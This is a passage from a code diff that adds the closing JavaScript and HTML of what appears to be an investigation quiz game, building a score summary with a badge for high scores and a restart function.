+                    <p><strong>Investigation Summary:</strong></p>
+            `;
+            
+            let correctDecisions = decisions.filter(d => d.correct).length;
+            let totalDecisions = decisions.length;
+            
+            summary += `
+                    <p>• Correct decisions: ${correctDecisions}/${totalDecisions}</p>
+                    <p>• Cases solved: ${currentCase}/3</p>
+                    <p>• Success rate: ${Math.round(percentage)}%</p>
+                </div>
+            `;
+            
+            if (percentage >= 75) {
+                summary += `
+                    <div style="text-align: center; margin-top: 30px;">
+                        <span class="badge">🏆 CERTIFIED INVESTIGATOR</span>
+                    </div>
+                `;
+            }
+            
+            document.getElementById('final-summary').innerHTML = summary;
+        }
+
+        function restartGame() {
+            document.querySelector('.end-screen').classList.remove('active');
+            document.querySelector('.start-screen').classList.add('active');
+        }
+    </script>
+</body>
+</html>
